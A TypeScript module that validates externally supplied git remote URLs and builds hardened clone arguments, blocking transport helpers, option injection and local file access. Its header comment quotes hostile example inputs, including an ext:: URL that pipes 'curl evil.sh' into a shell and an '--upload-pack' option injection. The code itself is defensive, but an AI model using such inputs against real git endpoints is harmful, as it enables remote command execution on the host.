// Validation for git remote URLs supplied over HTTP.
//
// `git clone <url>` is not a safe sink for an arbitrary string:
//
//   ext::sh -c 'curl evil.sh | sh'   the ext transport runs a shell command
//   --upload-pack=<cmd>              a leading dash is parsed as an option
//   file:///etc                      reads the local filesystem as a repo
//
// So the URL is checked against an allowlist of shapes before it reaches git,
// and git itself is invoked with the dangerous transports disabled and an
// end-of-options marker. Either alone would do; this input arrives from an
// endpoint with no authentication, so it gets both.

import { hasControlChars } from './text'

const MAX_LENGTH = 2048

// https://host/path  |  ssh://[user@]host[:port]/path  |  user@host:path
const ALLOWED_SHAPES = [
  /^https?:\/\/[A-Za-z0-9._~:\-[\]@!$&'()*+,;=%/]+$/,
  /^ssh:\/\/[A-Za-z0-9._~:\-[\]@!$&'()*+,;=%/]+$/,
  /^[A-Za-z0-9._-]+@[A-Za-z0-9._-]+:[A-Za-z0-9._~\-!$&'()*+,;=%/]+$/,
]

export interface RemoteUrlCheck {
  ok: boolean
  reason?: string
}

export function checkRemoteUrl(url: string): RemoteUrlCheck {
  if (url.length === 0) return { ok: false, reason: 'Remote URL is empty' }
  if (url.length > MAX_LENGTH) return { ok: false, reason: 'Remote URL is too long' }

  // Whitespace and control characters are how command payloads get smuggled in.
  if (/\s/.test(url) || hasControlChars(url)) {
    return { ok: false, reason: 'Remote URL contains whitespace or control characters' }
  }

  // git parses a leading dash as an option, not a URL.
  if (url.startsWith('-')) {
    return { ok: false, reason: 'Remote URL may not start with "-"' }
  }

  // `ext::`, `fd::` and friends select a transport helper that runs commands.
  if (url.includes('::')) {
    return {
      ok: false,
      reason: 'Remote URL may not contain "::" (transport helpers are not allowed)',
    }
  }

  if (/^(file|ext|fd):/i.test(url)) {
    return { ok: false, reason: 'Only https, http, ssh and user@host:path remotes are allowed' }
  }

  if (!ALLOWED_SHAPES.some((re) => re.test(url))) {
    return {
      ok: false,
      reason: 'Remote URL must look like https://host/path, ssh://host/path or user@host:path',
    }
  }

  return { ok: true }
}

/**
 * git arguments for cloning an externally supplied URL.
 *
 * `--` stops option parsing, and the protocol settings switch off the
 * transports that can execute commands or read local files, so a URL that
 * somehow slipped past validation still cannot run anything.
 */
export function safeCloneArgs(url: string, targetDir: string): string[] {
  return [
    '-c',
    'protocol.ext.allow=never',
    '-c',
    'protocol.fd.allow=never',
    '-c',
    'protocol.file.allow=never',
    'clone',
    '--',
    url,
    targetDir,
  ]
}
